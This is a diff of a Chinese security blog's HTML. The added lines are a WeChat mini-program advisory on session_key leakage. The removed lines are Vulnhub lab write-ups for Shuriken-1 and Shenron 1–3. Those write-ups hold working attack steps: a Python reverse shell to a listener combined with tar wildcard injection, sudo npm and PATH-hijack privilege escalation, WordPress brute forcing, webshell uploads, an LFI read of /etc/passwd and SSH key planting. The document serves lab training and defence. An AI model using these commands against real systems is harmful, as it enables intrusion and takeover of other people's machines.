+<p>1.通过auth.code2Session接口获取用户openid时，返回小程序的数据中包含了session_key字段，以泄露的url：&#x2F;api&#x2F;get_openid.php?code&#x3D;xxxx为例，具体的表现如下图所示：</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/5.png" alt="image"></p>
+<p>查看后端get_openid.php的源码，经排查发现$response 变量包含了session_key字段，开发者应去掉变量中的session_key字段，若需获取openid，应只提取该字段返回小程序即可。</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/6.png" alt="image"></p>
+<p>2.在解密开放数据时，使用了错误的方式，以获取手机号接口为例，通过事件回调获取微信服务器返回的加密数据（encryptedData和iv）后，将服务端中的session_key传送至小程序前端，直接在前端进行解密：﻿</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/7.png" alt="image"></p>
+<p>这种方式是绝对不可取的，正确的流程应该是将加密数据（encryptedData和iv）传至服务端后，结合服务端中的session_key进行解密获取手机号，然后返回给小程序。另外，目前平台已对获取手机号接口进行了安全升级，建议开发者使用新版本，以增强小程序的安全性。</p>
+<p>若小程序存在相应的session_key泄露漏洞问题，请开发者尽快自查并修复漏洞：</p>
+<p>请尽快在网络请求中，去除请求和响应中的session_key字段及其对应值，后续也不应该将session_key传到小程序客户端等服务器外的环境，以便消除风险。</p>
 </blockquote>
-<h3><span id="初步提权">初步提权</span></h3><blockquote>
-<p>1.利用sudo -l命令查看权限，发现可以执行npm，那么创建一个用于提权的json文件，利用npm提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/23.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &#x27;&#123;&quot;scripts&quot;:&#123;&quot;dev&quot;:&quot;/bin/bash&quot;&#125;&#125;&#x27; &gt; package.json</span><br><span class="line">sudo -u server-management npm run dev</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/24.png" alt="image-"></p>
-<p>2.成功提权到server-management后，可以在用户目录下发现第一个flag，user.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/25.png" alt="image-"></p>
+<h2><span id="其他常见问题">其他常见问题</span></h2><h3><span id="q1-如何进行相应的修复是需要把session_key字段更换个名字就可以了吗">Q1: 如何进行相应的修复，是需要把session_key字段更换个名字就可以了吗？</span></h3><blockquote>
+<p>A1: 不是，更换字段名无法从根本上消除风险，session_key这个字段及对应值不应该传到小程序客户端等服务器外的环境，需去除请求和响应中的所有相关信息，才可对该漏洞问题进行修复。</p>
 </blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.查看crontab，我们发现有一个backupsrv.sh每隔两分钟执行一次，我们可以查看下程序内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/26.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/opt/backupsrv.sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/27.png" alt="image-"></p>
-<p>2.查看程序后，我们知道它打开&#x2F;home&#x2F;server-management&#x2F;Documents目录并使用通配符(*) tar 参数创建它的备份，这种结构容易受到通配符注入的影响：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd Documents</span><br><span class="line">echo &quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.56.102\&quot;,9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;&quot; &gt; shell.sh，先写一个shell</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;，为shell创建触发</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/28.png" alt="image-"></p>
-<p>3.在kali开启对应端口监听，等待两分钟后程序定时执行得到shell为root权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9002</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/29.png" alt="image-"></p>
-<p>4.获得root权限后，在&#x2F;root目录下能够发现第二个flag，root.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/30.png" alt="image-"></p>
+<h3><span id="q2-解密开放数据的正确方式是什么">Q2: 解密开放数据的正确方式是什么？</span></h3><blockquote>
+<p>A2: 以获取手机号接口为例，通过事件回调获取微信服务器返回的加密数据（encryptedData和iv），将加密数据传至服务端后，结合服务端中的session_key进行解密获取手机号，然后返回给小程序。而不应将服务端中的session_key传送至小程序前端，直接在前端进行解密。</p>
+</blockquote>
+<h2><span id="相关文章">相关文章</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/community/minihome/doc/0004a84fcb0bb0e89eddbaa5156401?blockType=99">安全课堂｜关于小程序AppSecret密钥泄露漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/community/minihome/doc/00086415470e98a3972e9d90856c01?blockType=99">安全课堂｜关于小程序云AK&#x2F;SK泄露漏洞</a></p>
 </blockquote>
 
 
@@ -696,287 +791,7 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Shuriken/" rel="tag">Shuriken</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/24/Shenron-3/">
-                Shenron 3
-            </a>
-        </h2>
-    
-    <time>
-        Aug 24, 2022
-    </time>
-    <section class="content">
-        <h1><span id="shenron3">Shenron:3</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称shenron3">名称：shenron:3</span></h4><h4><span id="发布日期2021416">发布日期：2021.4.16</span></h4><h4><span id="作者shubham-mandloi">作者：Shubham mandloi</span></h4><h4><span id="系列shenron">系列：shenron</span></h4><h4><span id="推特shubhammandloi">推特：@shubhammandloi</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名shenron-3ova">文件名：shenron-3.ova</span></h4><h4><span id="文件大小13gb">文件大小：1.3GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshenronshenron-3ova">下载地址：</span></h4><h4><span id="md5-2c70da66904d9820bf065d2eacb08419">MD5: 2C70DA66904D9820BF065D2EACB08419</span></h4><h4><span id="sha1-8fb172649ffb6f44f2c81d8468b3b609d8e37e19">SHA1: 8FB172649FFB6F44F2C81D8468B3B609D8E37E19</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机shenron3和攻击机kali2021在VirtualBox下设置为桥接模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/24/Shenron-3/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.3.134：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-3/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.3.134/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-3/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放80端口，访问主页查看源码，没有太多线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.3.137 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-3/4.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-3/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现目录基本与wordpress有关：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.3.137/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-3/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="wordpress漏洞利用">Wordpress漏洞利用</span></h3><blockquote>
-<p>1.先把解析写入host，然后访问主页，发现是wordpress搭建的页面，可以用wpscan尝试寻找下漏洞：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-3/7.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-3/8.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.3.137 --plugins-detection aggressive</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-3/9.png" alt="image-"></p>
-<p>2.没有直接的漏洞发现，访问后台登录页面，发现存在admin用户，我们可以直接使用wpscan对后台登录页爆破（需要rockyou.txt字典）：</p>
-<p><img src="/2022/08/24/Shenron-3/10.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://shenron --passwords rockyou.txt --usernames admin</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-3/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="wordpress后台登录写入webshell">Wordpress后台登录，写入webshell</span></h3><blockquote>
-<p>1.使用账号和密码登录wordpress后台，可以在Appearance-Editor-404.php页写入webshell：</p>
-<p><img src="/2022/08/24/Shenron-3/12.png" alt="image-"></p>
-<p>2.修改kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php，覆盖404.php，update file，kali开启对应端口监听，通过访问不存在页触发webshell：</p>
-<p><img src="/2022/08/24/Shenron-3/13.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-3/14.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-3/15.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-3/16.png" alt="image-"></p>
-</blockquote>
-<h3><span id="初步提权">初步提权</span></h3><blockquote>
-<p>1.查看&#x2F;var&#x2F;www&#x2F;html目录下文件，在wp-config.php中能发现wordpress用户及数据库密码，但是进入数据库后并没有什么额外发现：</p>
-<p><img src="/2022/08/24/Shenron-3/17.png" alt="image-"></p>
-<p>2.尝试提权到shenron，发现登录密码不是Wordpress@123，而是之前爆出的iloverockyou：</p>
-<p><img src="/2022/08/24/Shenron-3/18.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.在&#x2F;home&#x2F;shenron目录下，我们查看文件权限，发现network的属主和属组都是root：</p>
-<p><img src="/2022/08/24/Shenron-3/19.png" alt="image-"></p>
-<p>2.利用pspy64s工具，我们查看network运行后的调用，发现回调用netstat，则我们可以新建一个netstat文件，进行提权操作：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br><span class="line">wget http://192.168.3.134:8001/pspy64s，shenron获取pspy64s工具</span><br><span class="line">chmod +x pspy64s</span><br><span class="line">./network</span><br><span class="line">./pspy64s</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-3/20.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-3/21.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash -p&quot; &gt; netstat</span><br><span class="line">chmod +x netstat</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd ~</span><br><span class="line">./network</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-3/22.png" alt="image-"></p>
-<p>3.在&#x2F;root目录下发现flag，即root.txt：</p>
-<p><img src="/2022/08/24/Shenron-3/23.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Shenron/" rel="tag">Shenron</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/24/Shenron-2/">
-                Shenron 2
-            </a>
-        </h2>
-    
-    <time>
-        Aug 24, 2022
-    </time>
-    <section class="content">
-        <h1><span id="shenron2">Shenron:2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称shenron2">名称：shenron:2</span></h4><h4><span id="发布日期202145">发布日期：2021.4.5</span></h4><h4><span id="作者shubham-mandloi">作者：Shubham mandloi</span></h4><h4><span id="系列shenron">系列：shenron</span></h4><h4><span id="推特shubhammandloi">推特：@shubhammandloi</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名shenron-2ova">文件名：shenron-2.ova</span></h4><h4><span id="文件大小37gb">文件大小：3.7GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshenronshenron-2ova">下载地址：</span></h4><h4><span id="md5-2883845ff2e1e122e1b1e75cf9a4b4e1">MD5: 2883845FF2E1E122E1B1E75CF9A4B4E1</span></h4><h4><span id="sha1-e66bda7ab264d1fea2103801bb422731f34f0599">SHA1: E66BDA7AB264D1FEA2103801BB422731F34F0599</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机shenron2和攻击机kali2021在VirtualBox下设置为桥接模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/24/Shenron-2/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.3.134：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.3.134/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放22，80及8080端口，访问主页查看源码，没有太多线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.3.136 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/4.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-2/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，没有发现太多值得关注的目录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.3.136/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="wordpress漏洞利用">Wordpress漏洞利用</span></h3><blockquote>
-<p>1.先把解析写入host，然后访问192.168.3.136:8080，发现是wordpress搭建的页面，可以用wpscan尝试寻找下漏洞：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/7.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-2/8.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://shenron:8080 --api-token $(cat /opt/wpscan-api) --enumerate</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/9.png" alt="image-"></p>
-<p>2.发现有Site Editor的漏洞，我们可以看一下如何利用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Site Editor 1.1.1</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/10.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://shenron:8080/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd，得到有两个用户和密码hash</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh密码爆破初步提权">SSH密码爆破，初步提权</span></h3><blockquote>
-<p>1.用hydra进行jenny爆破，得到密码登录SSH：</p>
-<p><img src="/2022/08/24/Shenron-2/12.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-2/13.png" alt="image-"></p>
-<p>2.在jenny用户下，查看suid，可以发现&#x2F;usr&#x2F;bin&#x2F;Execute，查看文件（需要导入本地查看，不然是elf乱码）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/14.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-2/15.png" alt="image-"></p>
-<p>3.我们可以知道这个文件的作用是将&#x2F;bin&#x2F;bash复制到&#x2F;mnt&#x2F;bash下，并给予shenron用户权限，那么我们可以利用这个文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Execute</span><br><span class="line">/mnt/bash -p</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/16.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.查看.pass文件，我们能发现一串类似base编码的字符串，利用base32解密发现是shenron用户登录的密码：</p>
-<p><img src="/2022/08/24/Shenron-2/17.png" alt="image-"></p>
-<p>2.登录shenron后，查看权限，发现可以直接提权到root：</p>
-<p><img src="/2022/08/24/Shenron-2/18.png" alt="image-"></p>
-<p>3.在&#x2F;root目录下，可以找到flag，即root.txt：</p>
-<p><img src="/2022/08/24/Shenron-2/19.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Shenron/" rel="tag">Shenron</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/24/Shenron-1/">
-                Shenron 1
-            </a>
-        </h2>
-    
-    <time>
-        Aug 24, 2022
-    </time>
-    <section class="content">
-        <h1><span id="shenron1">Shenron:1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称shenron1">名称：shenron:1</span></h4><h4><span id="发布日期20201215">发布日期：2020.12.15</span></h4><h4><span id="作者shubham-mandloi">作者：Shubham mandloi</span></h4><h4><span id="系列shenron">系列：shenron</span></h4><h4><span id="推特shubhammandloi">推特：@shubhammandloi</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名shenron-1ova">文件名：shenron-1.ova</span></h4><h4><span id="文件大小13gb">文件大小：1.3GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshenronshenron-1ova">下载地址：</span></h4><h4><span id="md5-3d9f0f620846bc15f4591e7ac56c04b2">MD5: 3D9F0F620846BC15F4591E7AC56C04B2</span></h4><h4><span id="sha1-4e1d33e2338ada4ca1c093cd67725850a033baad">SHA1: 4E1D33E2338ADA4CA1C093CD67725850A033BAAD</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机shenron1和攻击机kali2021在VirtualBox下设置为桥接模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/24/Shenron-1/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放22，80端口，访问主页还是apache2的初始页：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.113 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/4.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-1/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现&#x2F;joomla和&#x2F;test两个值得关注的目录，可以进行访问：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.113/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="寻找密码登录joomla后台">寻找密码，登录joomla后台</span></h3><blockquote>
-<p>1.访问192.168.56.113&#x2F;test，发现有password文件，查看password源码，能够发现admin用户的密码：</p>
-<p><img src="/2022/08/24/Shenron-1/7.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-1/8.png" alt="image-"></p>
-<p>2.可以用admin用户登录joomla管理后台：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.113/joomla -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，寻找后台</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/9.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-1/10.png" alt="image-"></p>
-</blockquote>
-<h3><span id="上传webshell">上传webshell</span></h3><blockquote>
-<p>1.修改kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php，同时开启kali端口监听：</p>
-<p><img src="/2022/08/24/Shenron-1/11.png" alt="image-"></p>
-<p>2.在joomla后台管理页Templates-Templates-Protostar Details and Files-error.php内写入webshell内容后保存：</p>
-<p><img src="/2022/08/24/Shenron-1/12.png" alt="image-"></p>
-<p>3.访问不存在页面，触发webshell，再使用python构建交互式shell：</p>
-<p><img src="/2022/08/24/Shenron-1/13.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-1/14.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh免密登录逐步提权">SSH免密登录，逐步提权</span></h3><blockquote>
-<p>1.在&#x2F;var&#x2F;www&#x2F;html&#x2F;joomla目录下，我们从configuration.php文件中可以发现jenny用户及其密码，可用作登录：</p>
-<p><img src="/2022/08/24/Shenron-1/15.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-1/16.png" alt="image-"></p>
-<p>2.登录jenny用户后，我们尝试使用ssh免密登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub，首先在kali上查看自己的ssh密钥并复制下来，没有的话执行ssh-keygen，回车默认</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/17.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">cd .ssh</span><br><span class="line">echo __public key__ &gt;&gt; authorized_keys，在jenny用户进入/.ssh目录，写入kali复制的密钥</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/18.png" alt="image-"></p>
